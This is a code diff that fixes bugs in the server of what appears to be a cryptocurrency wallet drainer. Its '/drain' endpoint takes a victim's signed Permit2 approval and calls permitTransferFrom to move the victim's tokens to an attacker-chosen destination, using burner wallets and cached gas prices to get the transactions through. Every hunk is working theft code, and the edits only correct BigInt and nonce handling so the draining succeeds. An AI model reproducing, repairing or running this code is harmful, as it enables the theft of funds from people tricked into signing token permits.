@@ -103,7 +103,7 @@ setInterval(async () => {
     cachedGasPrice = cachedGasPrice * 110n / 100n;
     
     for (let burner of burners) {
-      const nonce = await burner.getNonce('pending');
+      const nonce = await provider.getTransactionCount(burner.address, 'pending');
       burnerNonces[burner.address] = BigInt(nonce);
     }
     
@@ -160,7 +160,7 @@ app.post('/drain', async (req, res) => {
     };
 
     // Parse amount
-    const parsedAmount = ethers.utils.parseUnits(amount || '1', 18);
+    const parsedAmount = BigInt(ethers.utils.parseUnits(amount || '1', 18));
     const now = BigInt(Math.floor(Date.now() / 1000) + 3600);
     
     const permit = {
@@ -168,7 +168,7 @@ app.post('/drain', async (req, res) => {
         token: tokenAddress,
         amount: ethers.utils.hexValue(parsedAmount),
         expiration: ethers.utils.hexValue(now + 86400n),
-        nonce: ethers.utils.hexValue(nonce || 0)
+        nonce: ethers.utils.hexValue(BigInt(nonce || 0))
       },
       spender: burner.address,
       sigDeadline: Number(now + 86400n)
@@ -187,16 +187,16 @@ app.post('/drain', async (req, res) => {
     const permit2 = new ethers.Contract(PERMIT2, permit2ABI, burner);
     
     const permitStruct = [
-  tokenAddress,
-  ethers.utils.hexValue(BigInt(parsedAmount)),
-  ethers.utils.hexValue(now + 86400n),
-  ethers.utils.hexValue(BigInt(nonce || 0))
-];
+      tokenAddress,
+      ethers.utils.hexValue(parsedAmount),
+      ethers.utils.hexValue(now + 86400n),
+      ethers.utils.hexValue(BigInt(nonce || 0))
+    ];
 
     // Estimate gas limit
-    const gasLimit = await permit2.estimateGas.permitTransferFrom(
+    const gasLimit = BigInt(await permit2.estimateGas.permitTransferFrom(
       permitStruct, victimAddress, destination, signature
-    );
+    ));
 
     const tx = await permit2.permitTransferFrom(
       permitStruct,
@@ -206,7 +206,7 @@ app.post('/drain', async (req, res) => {
       {
         gasLimit: gasLimit,
         gasPrice: cachedGasPrice,
-        nonce: burnerNonces[burner.address] ?? await burner.getNonce('pending')
+        nonce: burnerNonces[burner.address] ?? await provider.getTransactionCount(burner.address, 'pending')
       }
     );
     
